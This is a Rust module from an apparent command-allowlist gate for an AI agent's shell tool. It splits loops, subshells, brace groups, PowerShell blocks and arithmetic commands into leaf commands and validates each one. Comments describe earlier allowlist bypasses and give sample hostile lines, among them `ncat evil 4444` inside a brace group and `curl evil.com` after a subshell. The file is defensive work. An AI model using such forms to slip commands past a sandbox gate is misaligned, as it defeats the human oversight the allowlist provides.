use crate::core::error::ShellError;

use super::ps_statements::Found;
use super::{
    contains_double_semicolon, extract_all_commands, extract_base_from_segment, find_shell_word,
    quote_aware_token_end, rewrite_case_constructs, shell_tokenize, skip_env_assignments,
    skip_powershell_assignment,
};

/// Shell reserved words whose operator-delimited segment carries no validatable
/// simple command: the `for`/`select` loop *header* (`for x in LIST`) is data,
/// and `done`/`fi`/`in` close or join a construct. A segment starting with one
/// of these contributes no leaf command.
const HEADER_KEYWORDS: &[&str] = &["for", "select", "in", "done", "fi"];

/// Shell reserved words that *introduce* a command which must still be validated:
/// the condition of `if`/`while`/`until`, the body after `do`/`then`/`else`/
/// `elif`, and the `time`/`!` modifiers. They are stripped so the real leaf
/// command behind them is checked against the allowlist.
const BODY_INTRO_KEYWORDS: &[&str] = &[
    "do", "then", "else", "elif", "if", "while", "until", "time", "!",
];

/// Expand a (possibly compound) command into the list of simple-command *leaves*
/// that must each satisfy the allowlist. This is what makes `for … do CMD; done`,
/// `if COND; then CMD; fi`, `while …; do CMD; done` and balanced `( CMD )`
/// subshells usable in restricted mode without weakening deny-by-default: every
/// leaf is still validated, headers/terminators contribute nothing, and any form
/// this conservative walker cannot prove safe (`case`/`esac`, `;;`, a subshell
/// with trailing content, deep nesting) is rejected — it over-blocks, never
/// under-blocks.
pub(super) fn expand_to_leaf_segments(command: &str) -> Result<Vec<String>, ShellError> {
    let command = rewrite_case_constructs(command)?;
    if find_shell_word(&command, "esac", 0).is_some() || contains_double_semicolon(&command) {
        return Err(format!(
            "[BLOCKED — DO NOT RETRY] Unparsed case-arm terminator or `esac` \
             construct cannot be leaf-validated safely in restricted (allowlisted) \
             shell mode. Run a script file or disable the allowlist instead.\n\
             Command: {command}"
        )
        .into());
    }
    let mut leaves = Vec::new();
    for seg in extract_all_commands(&command) {
        resolve_segment_leaves(&seg, 0, &mut leaves)?;
    }
    Ok(leaves)
}

/// Resolve one operator-delimited segment into zero or more leaf commands,
/// stripping reserved words and recursing into balanced `( … )` subshells.
fn resolve_segment_leaves(
    segment: &str,
    depth: usize,
    out: &mut Vec<String>,
) -> Result<(), ShellError> {
    if depth > 4 {
        return Err(format!(
            "[BLOCKED — DO NOT RETRY] Shell command nests compound/subshell groups too \
             deeply to validate safely.\nCommand: {segment}"
        )
        .into());
    }
    let mut s = segment.trim();
    if is_zsh_short_loop(strip_body_intro_keywords(s)) {
        return Err(zsh_only_form(segment));
    }
    // GH #2134: `(( expr ))` is arithmetic evaluation, like `$(( ))` (#1664),
    // not a nested subshell or a PowerShell `( … )` expression. Walking it as
    // one made a variable (`i`) or an expression fragment (`i++`) the command
    // to gate. It runs only the command substitutions in its expression, so
    // those are the leaves. Checked first, behind `while`/`if`/`do` too, so
    // neither walk below can claim it.
    if let Some(expr) = arithmetic_command_expr(strip_body_intro_keywords(s)) {
        for inner in arithmetic_substitutions(expr, segment)? {
            for inner_seg in extract_all_commands(inner) {
                resolve_segment_leaves(&inner_seg, depth + 1, out)?;
            }
        }
        return Ok(());
    }
    // #1930: PowerShell control flow (`if (…) { … }`, `try { … } catch { … }`,
    // `foreach (…) { … }`) and expression statements (`$t.Actions`, `($t)`,
    // `@(cmd)`, `[Type]::Member()`) carry no command of their own; the
    // commands inside them are resolved as leaves.
    if let Some(found) = super::ps_statements::statement_commands(s) {
        for item in found? {
            match item {
                Found::Command(text) => resolve_commands(&text, depth + 1, out)?,
                Found::Block(body) => resolve_block_body(&body, depth, out)?,
            }
        }
        return Ok(());
    }
    if let Some(commands) = super::ps_statements::expression_commands(s) {
        for command in commands {
            resolve_commands(&command, depth + 1, out)?;
        }
        return Ok(());
    }
    loop {
        let tokens = shell_tokenize(s);
        let Some(first) = tokens.first() else {
            return Ok(()); // empty → no command
        };
        let kw = first.as_str();
        if HEADER_KEYWORDS.contains(&kw) {
            return Ok(()); // loop header / terminator carries no leaf command
        }
        if BODY_INTRO_KEYWORDS.contains(&kw) {
            s = remainder_after_first_token(s).trim();
            if s.is_empty() {
                return Ok(());
            }
            continue;
        }
        break;
    }
    let assignment_rhs = skip_powershell_assignment(s);
    if assignment_rhs.len() != s.len() {
        return resolve_segment_leaves(assignment_rhs, depth + 1, out);
    }
    if let Some(inner) = balanced_paren_inner(s) {
        for inner_seg in extract_all_commands(inner) {
            resolve_segment_leaves(&inner_seg, depth + 1, out)?;
        }
        return Ok(());
    }
    // #1514: PowerShell commonly wraps a read-only cmdlet before selecting a
    // property: `(Get-Item 'x').VersionInfo`. Validate the inner command and
    // accept only a conservative property chain. Method calls, indexers and
    // operators fall through to deny-by-default as an unrecognized command.
    if let Some(inner) = powershell_property_expression_inner(s) {
        for inner_seg in extract_all_commands(inner) {
            resolve_segment_leaves(&inner_seg, depth + 1, out)?;
        }
        return Ok(());
    }
    // #968: a `{ cmd1; cmd2; }` brace group must be recursed into exactly like
    // a `( … )` subshell above — otherwise every command after the first
    // escapes validation entirely. #939 shielded `{ }` in split_on_operators
    // (so the group survives as one segment) and taught
    // extract_base_from_segment to skip the leading `{`, but only the FIRST
    // inner command becomes that base; a non-allowlisted `cmd2` (e.g.
    // `{ echo hi; ncat evil 4444; }`) then bypassed the allowlist, the `$()`
    // hard-block, and the dangerous-flags checks alike. Recursing re-validates
    // each inner command as its own leaf. This is a validation-only walk — the
    // command string is never rewritten — so the cd/env-persistence property
    // that #939 relied on (why it declined to recurse) is unaffected.
    //
    // GHSA-rxv5-4c3x-g4q6 E: a trailing redirection binds the group's
    // descriptors (`{ a; b; } > out`), as for a subshell (#1751), so the group
    // is still recursed into — it used to be checked by `a` alone. Anything
    // else after the `}` (`{ a; } b`, zsh `{ a } always { b }`) is refused.
    if let Some((inner, suffix)) = brace_group(s) {
        if !suffix.trim().is_empty() && !is_redirect_only_suffix(suffix) {
            return Err(zsh_only_form(segment));
        }
        for inner_seg in extract_all_commands(inner) {
            resolve_segment_leaves(&inner_seg, depth + 1, out)?;
        }
        return Ok(());
    }
    // #855: a segment that is *entirely* env-var assignments (`VAR=$(cmd …)`,
    // nothing left over — `out=$(gh pr view …)` is a common, legitimate idiom
    // for capturing command output) still executes the substituted command.
    // extract_base_from_segment resolves this segment's own base to empty
    // (skip_env_assignments consumes the whole thing), so without this the
    // substituted command would silently escape validation entirely — not
    // just fail to be *found*, but never be *checked* at all. Recurse into it
    // as its own leaf so `gh`, not the assignment wrapper, is what actually
    // gets checked against the allowlist.
    for inner in assignment_substitution_leaves(s) {
        for inner_seg in extract_all_commands(inner) {
            resolve_segment_leaves(&inner_seg, depth + 1, out)?;
        }
    }
    // Anything else (incl. `( … ) trailing`, leftover delimiters) is pushed
    // verbatim: base-extraction below sees a first token like `(ls)` that
    // cannot match any allowlist entry, so it is blocked. `cmd (sub)` without
    // a separator is a shell syntax error, so no executable leaf escapes
    // here. A `{ cmd; }` brace group is the one exception: split_on_operators
    // already shields it with `brace_depth` the same way `( … )` is shielded
    // with `paren_depth`, so it survives as one leaf here, and
    // extract_base_from_segment (below) skips the leading `{` token to find
    // the real base command inside — no recursion needed like subshells get,
    // since `cd`/env changes inside `{ }` must persist to the caller (#939,
    // agent_wrapper::rebuild's cwd-tracking wrapper).
    //
    // #1930: a cmdlet runs the script blocks it is handed
    // (`ForEach-Object { Remove-Item $_ }`), so each block body is resolved
    // into leaves of its own, after the cmdlet itself so its verdict comes
    // first.
    let base = extract_base_from_segment(s);
    let bodies = super::ps_statements::script_block_bodies(s, &base);
    // zsh runs brace bodies without `do`/`then`: `while true { cmd }`,
    // `if [[ x ]] { cmd }`, `repeat 2 { cmd }`. In bash a lone `{` argument
    // is a syntax error waiting to happen; PowerShell script blocks are
    // resolved below instead.
    if bodies.is_empty()
        && super::tokenizer::detect_function_def(s).is_none()
        && shell_tokenize(s).iter().skip(1).any(|t| t == "{")
    {
        return Err(zsh_only_form(segment));
    }
    out.push(s.to_string());
    for body in bodies {
        resolve_block_body(&body, depth, out)?;
    }
    Ok(())
}

/// zsh's short loop `for x (a b) cmd` / `foreach x (a b)` runs `cmd` from
/// the header segment itself (GHSA-rxv5-4c3x-g4q6 E); bash has no such form.
/// Checked before the PowerShell walk, which would read `(a b)` as a loop
/// header and drop `cmd`. PowerShell's own `for (…)`/`foreach (…)` put the
/// parenthesis right after the keyword and stay with that walk.
fn is_zsh_short_loop(s: &str) -> bool {
    let tokens = shell_tokenize(s);
    matches!(
        tokens.first().map(String::as_str),
        Some("for" | "select" | "foreach")
    ) && tokens.get(1).is_some_and(|name| !name.starts_with('('))
        && tokens[2..]
            .iter()
            .any(|t| t.starts_with('(') && !t.starts_with("(("))
}

fn zsh_only_form(segment: &str) -> ShellError {
    format!(
        "[BLOCKED — DO NOT RETRY] This command uses a brace body or short loop form that \
         zsh runs but this gate cannot split into its commands (`while c {{ … }}`, \
         `for x (…) cmd`, `{{ … }} always {{ … }}`). Use `do … done`/`then … fi` and end \
         brace groups with `; }}`.\nCommand: {segment}"
    )
    .into()
}

/// Resolve every segment of a command text found inside PowerShell syntax.
fn resolve_commands(text: &str, depth: usize, out: &mut Vec<String>) -> Result<(), ShellError> {
    for segment in extract_all_commands(text) {
        resolve_segment_leaves(&segment, depth, out)?;
    }
    Ok(())
}

/// #1930: resolve the body of a PowerShell `{ … }` block. Only PowerShell runs
/// its statements, so an inert expression statement (`$_.Length -gt 100`,
/// `$n = $n + 1`) contributes just the commands inside it; anything else is a
/// pipeline, resolved as usual.
fn resolve_block_body(body: &str, depth: usize, out: &mut Vec<String>) -> Result<(), ShellError> {
    for statement in extract_all_commands(body) {
        match super::ps_statements::block_statement_commands(&statement) {
            Some(commands) => {
                for command in commands {
                    resolve_commands(&command, depth + 1, out)?;
                }
            }
            None => resolve_segment_leaves(&statement, depth + 1, out)?,
        }
    }
    Ok(())
}

/// Find the inner text of a `$(...)` command substitution whose `(` sits at
/// byte offset `open` in `s`. Quote-aware (mirrors `balanced_paren_inner`) so
/// a nested quoted `)` — e.g. inside a jq filter — doesn't end the walk early.
/// Returns `(inner, end)` with `end` just past the matching `)`; `None` if
/// unbalanced.
pub(super) fn balanced_paren_at(s: &str, open: usize) -> Option<(&str, usize)> {
    let bytes = s.as_bytes();
    let len = bytes.len();
    let mut depth: i32 = 0;
    let mut in_single_quote = false;
    let mut in_double_quote = false;
    let mut i = open;
    while i < len {
        let ch = bytes[i];
        if in_single_quote {
            if ch == b'\'' {
                in_single_quote = false;
            }
            i += 1;
            continue;
        }
        if in_double_quote {
            match ch {
                b'\\' => i = (i + 2).min(len),
                b'"' => {
                    in_double_quote = false;
                    i += 1;
                }
                _ => i += 1,
            }
            continue;
        }
        match ch {
            b'\\' => i = (i + 2).min(len),
            b'\'' => {
                in_single_quote = true;
                i += 1;
            }
            b'"' => {
                in_double_quote = true;
                i += 1;
            }
            b'(' => {
                depth += 1;
                i += 1;
            }
            b')' => {
                depth -= 1;
                i += 1;
                if depth == 0 {
                    return Some((&s[open + 1..i - 1], i));
                }
            }
            _ => i += 1,
        }
    }
    None
}

fn powershell_property_expression_inner(segment: &str) -> Option<&str> {
    let trimmed = segment.trim();
    if !trimmed.starts_with('(') {
        return None;
    }
    let (inner, end) = balanced_paren_at(trimmed, 0)?;
    let mut suffix = trimmed[end..].trim();
    if suffix.is_empty() {
        return None;
    }
    while let Some(rest) = suffix.strip_prefix('.') {
        let name_len = rest
            .bytes()
            .take_while(|byte| byte.is_ascii_alphanumeric() || *byte == b'_')
            .count();
        if name_len == 0 || !rest.as_bytes()[0].is_ascii_alphabetic() {
            return None;
        }
        suffix = &rest[name_len..];
    }
    suffix.is_empty().then_some(inner)
}

/// #855: the leading run of `VAR=value` assignment tokens in `s` (the same
/// prefix `skip_env_assignments` walks past) — as a slice of `s`, covering
/// both `VAR=$(cmd)` alone and `A=1 B=$(cmd) realcmd args` (the assignments
/// still execute even when a real command follows them).
fn leading_assignment_prefix(s: &str) -> &str {
    let rest = skip_env_assignments(s);
    let offset = (rest.as_ptr() as usize).saturating_sub(s.as_ptr() as usize);
    &s[..offset.min(s.len())]
}

/// #855: collect the inner command text of every top-level `$(...)` found in
/// `s`'s leading env-assignment prefix (`VAR=$(cmd)`, `A=1 B=$(cmd) realcmd`,
/// …) — those substitutions execute regardless of whether a real command
/// follows the assignments. `cmd "$(sub)"` in *argument* position (after the
/// real command) is untouched here and keeps its existing warn-only handling
/// (`check_substitution_in_args`); this only closes the gap for substitutions
/// hiding in a leading assignment.
fn assignment_substitution_leaves(s: &str) -> Vec<&str> {
    let prefix = leading_assignment_prefix(s);
    if prefix.is_empty() {
        return Vec::new();
    }
    let mut found = Vec::new();
    let bytes = prefix.as_bytes();
    let len = bytes.len();
    let mut in_single_quote = false;
    let mut in_double_quote = false;
    let mut i = 0;
    while i < len {
        let ch = bytes[i];
        if in_single_quote {
            if ch == b'\'' {
                in_single_quote = false;
            }
            i += 1;
            continue;
        }
        if in_double_quote {
            match ch {
                b'\\' => {
                    i = (i + 2).min(len);
                    continue;
                }
                b'"' => in_double_quote = false,
                _ => {}
            }
            i += 1;
            continue;
        }
        match ch {
            b'\\' => {
                i = (i + 2).min(len);
                continue;
            }
            b'\'' => in_single_quote = true,
            b'"' => in_double_quote = true,
            b'$' if i + 1 < len && bytes[i + 1] == b'(' => {
                // `$((expr))` is arithmetic expansion, not command substitution
                // (GH #1664). It evaluates against the shell's own variables and
                // can never execute anything, but the `(expr)` inside looked like
                // a subshell: `x=$((1+2))` yielded a leaf `1+2`, which the
                // allowlist then rejected as an unknown command — with the
                // uncopyable advice `lean-ctx allow 1+2`.
                //
                // Skipping the whole expansion is what keeps counters usable, and
                // so keeps bounded wait/poll loops writable at all. Nothing is
                // given up: there is no command in there to gate. #1514 fixed the
                // same parser for `VAR=$(cmd)` and did not reach this form.
                if bytes.get(i + 2) == Some(&b'(') {
                    if let Some((_, end)) = balanced_paren_at(prefix, i + 2) {
                        // `end` is past the inner `)`; the outer one follows.
                        i = if prefix.as_bytes().get(end) == Some(&b')') {
                            end + 1
                        } else {
                            end
                        };
                        continue;
                    }
                }
                if let Some((inner, end)) = balanced_paren_at(prefix, i + 1) {
                    found.push(inner);
                    i = end;
                    continue;
                }
            }
            _ => {}
        }
        i += 1;
    }
    found
}

/// Return the substring after the first whitespace-delimited (quote-aware) token.
fn remainder_after_first_token(s: &str) -> &str {
    let trimmed = s.trim_start();
    let end = quote_aware_token_end(trimmed);
    &trimmed[end..]
}

/// #1751: is `suffix` — everything after a subshell's closing paren — nothing
/// but redirections? `( … ) 2>&1` is still a plain subshell: the redirect binds
/// the group's descriptors and cannot introduce a command, so the body must
/// keep being recursed into exactly as it is without the redirect. `( … ) curl
/// evil.com` must NOT qualify — that trailing command has to fall through to
/// base extraction and stay blocked (#462).
///
/// Deliberately conservative: anything this does not positively recognise as a
/// redirect (a quoted target with spaces, a herestring) returns `false` and
/// keeps today's blocking behaviour rather than guessing.
fn is_redirect_only_suffix(suffix: &str) -> bool {
    let mut rest = suffix.trim();
    while !rest.is_empty() {
        let bytes = rest.as_bytes();
        // Optional leading descriptor number (`2>`, `1>&2`), or `&>`/`&>>`
        // which merges both streams.
        let mut head = 0;
        while head < bytes.len() && bytes[head].is_ascii_digit() {
            head += 1;
        }
        if head == 0 && bytes.first() == Some(&b'&') && bytes.get(1) == Some(&b'>') {
            head = 1;
        }
        let op = &rest[head..];
        let op_len = if op.starts_with(">>")
            || op.starts_with(">|")
            || op.starts_with(">&")
            || op.starts_with("<&")
        {
            2
        } else if op.starts_with('>') || op.starts_with('<') {
            1
        } else {
            return false;
        };
        rest = op[op_len..].trim_start();
        // Target: `&1`/`-` for descriptor dups, otherwise one shell word.
        let Some(target) = redirect_target_len(rest) else {
            return false;
        };
        if target == 0 {
            return false;
        }
        rest = rest[target..].trim_start();
    }
    true
}

/// Byte length of the single shell word that forms a redirect target at the
/// start of `rest` (#2149). Quoted parts, `$VAR`/`${VAR}`, and `$( … )` or
/// backtick substitutions belong to the word, exactly as they would after a
/// plain command (`echo ok > /tmp/lc_$(echo b).txt`): the word itself runs
/// nothing, and the commands in its substitutions are extracted and gated by
/// the same segment walk and substitution check as without the subshell.
/// Unquoted whitespace or an operator ends the word; a word that starts with
/// `<`/`>` (process substitution, herestring) yields 0. `None`: an
/// unterminated quote or substitution, which is never accepted.
fn redirect_target_len(rest: &str) -> Option<usize> {
    let bytes = rest.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        match bytes[i] {
            b if b.is_ascii_whitespace() => break,
            b';' | b'|' | b'&' | b'(' | b')' | b'<' | b'>' => break,
            b'\\' => i += 2,
            b'\'' => i += rest[i + 1..].find('\'')? + 2,
            b'"' => i = closing_double_quote(rest, i + 1)? + 1,
            b'$' if bytes.get(i + 1) == Some(&b'(') => i = balanced_paren_at(rest, i + 1)?.1,
            b'`' => i = super::case_construct::skip_backticks(bytes, i)?,
            _ => i += 1,
        }
    }
    Some(i.min(bytes.len()))
}

/// Index of the `"` closing a double-quoted string whose body starts at
/// `from`, stepping over escapes and `$( … )`/backtick substitutions (which
/// may themselves contain quotes).
fn closing_double_quote(s: &str, from: usize) -> Option<usize> {
    let bytes = s.as_bytes();
    let mut i = from;
    while i < bytes.len() {
        match bytes[i] {
            b'\\' => i += 2,
            b'"' => return Some(i),
            b'$' if bytes.get(i + 1) == Some(&b'(') => i = balanced_paren_at(s, i + 1)?.1,
            b'`' => i = super::case_construct::skip_backticks(bytes, i)?,
            _ => i += 1,
        }
    }
    None
}

/// GH #2134: if `segment` is an arithmetic command `(( expr ))`, return `expr`.
///
/// Bash's rule: after `((`, the group opened by the second `(` must close
/// directly before a final `)`. `((a) )` or `((a); (b))` fail it and are
/// nested subshells, which keep the subshell walk and its leaf checks. A
/// trailing redirect also fails it and stays blocked.
pub(super) fn arithmetic_command_expr(segment: &str) -> Option<&str> {
    let trimmed = segment.trim();
    if !trimmed.starts_with("((") {
        return None;
    }
    let (_, inner_end) = balanced_paren_at(trimmed, 1)?;
    (trimmed.as_bytes().get(inner_end) == Some(&b')') && inner_end + 1 == trimmed.len())
        .then(|| &trimmed[2..inner_end - 1])
}

/// GH #2134: does `command` contain an arithmetic command, also behind
/// `while`/`if`/`do` …? Called only when the line resolved to no leaves: then
/// `((i++))` or `while (( i < 3 )); do ((i++)); done` ran no command, which is
/// not an empty command.
pub(super) fn has_arithmetic_command(command: &str) -> bool {
    let command = rewrite_case_constructs(command).unwrap_or_else(|_| command.to_string());
    extract_all_commands(&command)
        .iter()
        .any(|segment| arithmetic_command_expr(strip_body_intro_keywords(segment)).is_some())
}

/// `segment` without its leading `while`/`if`/`do`/… keywords.
fn strip_body_intro_keywords(segment: &str) -> &str {
    let mut s = segment.trim();
    while shell_tokenize(s)
        .first()
        .is_some_and(|kw| BODY_INTRO_KEYWORDS.contains(&kw.as_str()))
    {
        s = remainder_after_first_token(s).trim();
    }
    s
}

/// GH #2134: the inner text of every `$( … )` and backtick substitution in an
/// arithmetic expression — the only commands `(( ))` can run. Bash expands the
/// expression like a double-quoted word, so quotes protect nothing outside
/// the substitutions and are not honoured here. A nested `$(( … ))` is walked
/// into, not skipped, so a substitution inside it is found too. An
/// unterminated substitution cannot be validated and blocks the command.
pub(super) fn arithmetic_substitutions<'a>(
    expr: &'a str,
    segment: &str,
) -> Result<Vec<&'a str>, ShellError> {
    let bytes = expr.as_bytes();
    let mut found = Vec::new();
    let mut i = 0;
    while i < bytes.len() {
        match bytes[i] {
            b'\\' => i += 2,
            b'$' if bytes.get(i + 1) == Some(&b'(') => {
                let Some((inner, end)) = balanced_paren_at(expr, i + 1) else {
                    return Err(unterminated_arithmetic_substitution(segment));
                };
                let nested_arithmetic = bytes.get(i + 2) == Some(&b'(')
                    && balanced_paren_at(expr, i + 2).is_some_and(|(_, e)| e + 1 == end);
                if nested_arithmetic {
                    i += 3;
                } else {
                    found.push(inner);
                    i = end;
                }
            }
            b'`' => {
                let Some(end) = super::case_construct::skip_backticks(bytes, i) else {
                    return Err(unterminated_arithmetic_substitution(segment));
                };
                found.push(&expr[i + 1..end - 1]);
                i = end;
            }
            _ => i += 1,
        }
    }
    Ok(found)
}

fn unterminated_arithmetic_substitution(segment: &str) -> ShellError {
    format!(
        "[BLOCKED — DO NOT RETRY] Arithmetic command `(( … ))` contains an \
         unterminated command substitution that cannot be validated safely.\n\
         Command: {segment}"
    )
    .into()
}

/// If `s` is a single balanced `( … )` subshell, return the inner command
/// (`(a; b)` → `a; b`). A trailing redirection is part of the subshell and is
/// accepted (`(a) 2>&1`, #1751); any other trailing content returns `None`, so
/// `(a) b` falls through to base extraction, which blocks it.
fn balanced_paren_inner(segment: &str) -> Option<&str> {
    let trimmed = segment.trim();
    let bytes = trimmed.as_bytes();
    if bytes.first() != Some(&b'(') {
        return None;
    }
    let len = bytes.len();
    let mut depth: i32 = 0;
    let mut in_single_quote = false;
    let mut in_double_quote = false;
    let mut i = 0;
    while i < len {
        let ch = bytes[i];
        if in_single_quote {
            if ch == b'\'' {
                in_single_quote = false;
            }
            i += 1;
            continue;
        }
        if in_double_quote {
            match ch {
                b'\\' => i += 1, // \" and \\ stay inside the string
                b'"' => in_double_quote = false,
                _ => {}
            }
            i += 1;
            continue;
        }
        match ch {
            // Escaped parens are data (GL #1160): `rg foo\(bar\)` must not
            // shift the depth this walker uses to find the real closing paren.
            b'\\' => i += 1,
            b'\'' => in_single_quote = true,
            b'"' => in_double_quote = true,
            b'(' => depth += 1,
            b')' => {
                depth -= 1;
                if depth == 0 {
                    return if i == len - 1 || is_redirect_only_suffix(&trimmed[i + 1..]) {
                        Some(trimmed[1..i].trim())
                    } else {
                        None
                    };
                }
            }
            _ => {}
        }
        i += 1;
    }
    None
}

/// If `s` is a single balanced `{ … }` brace group with nothing trailing the
/// closing `}`, return the inner command list (`{ a; b; }` → `a; b`). Mirrors
/// [`balanced_paren_inner`] so [`resolve_segment_leaves`] can recurse into the
/// group and validate every inner command, not just the first (#968).
///
/// Only a real brace *group* qualifies: the `{` must be followed by whitespace
/// (`{ cmd; }`), never `{a,b}` brace *expansion* — that is an argument, and its
/// enclosing command's base is validated normally. `{ a; } b` returns `None`
/// (trailing content → falls through to base extraction), matching the paren
/// walker; such a form is a shell syntax error anyway.
pub(super) fn balanced_brace_inner(segment: &str) -> Option<&str> {
    brace_group(segment).and_then(|(inner, suffix)| suffix.is_empty().then_some(inner))
}

/// A closed `{ … }` brace group at the start of `segment`: its inner command
/// list and the text after the closing `}`. `None` when `segment` does not
/// open a group or the group never closes.
fn brace_group(segment: &str) -> Option<(&str, &str)> {
    let trimmed = segment.trim();
    let bytes = trimmed.as_bytes();
    if bytes.first() != Some(&b'{') {
        return None;
    }
    // A brace *group* requires whitespace after `{`; `{a,b}` (expansion) or a
    // bare `{` at EOF is not a group we should peel open.
    match bytes.get(1) {
        Some(&(b' ' | b'\t' | b'\n' | b'\r')) => {}
        _ => return None,
    }
    let len = bytes.len();
    let mut depth: i32 = 0;
    let mut in_single_quote = false;
    let mut in_double_quote = false;
    let mut i = 0;
    while i < len {
        let ch = bytes[i];
        if in_single_quote {
            if ch == b'\'' {
                in_single_quote = false;
            }
            i += 1;
            continue;
        }
        if in_double_quote {
            match ch {
                b'\\' => i += 1, // \" and \\ stay inside the string
                b'"' => in_double_quote = false,
                _ => {}
            }
            i += 1;
            continue;
        }
        match ch {
            b'\\' => i += 1, // escaped brace is data, not a group delimiter
            b'\'' => in_single_quote = true,
            b'"' => in_double_quote = true,
            b'{' => depth += 1,
            b'}' => {
                depth -= 1;
                if depth == 0 {
                    return Some((trimmed[1..i].trim(), &trimmed[i + 1..]));
                }
            }
            _ => {}
        }
        i += 1;
    }
    None
}
